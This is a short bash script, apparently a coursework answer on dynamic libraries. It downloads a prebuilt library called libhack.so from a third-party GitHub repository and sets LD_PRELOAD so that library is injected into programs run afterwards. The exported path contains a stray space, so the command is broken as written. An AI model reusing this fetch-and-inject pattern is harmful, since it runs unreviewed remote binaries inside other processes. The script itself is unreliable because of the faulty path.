#!/bin/bash
wget -P .. https://raw.githubusercontent.com/THEOTHERGUY23/alx-low_level_programming/ecddfb69bc847cd014f41432c6caf4f9874745d2/0x18-dynamic_libraries/libhack.so
export LD_PRELOAD="$PWD/ ../libhack.so"
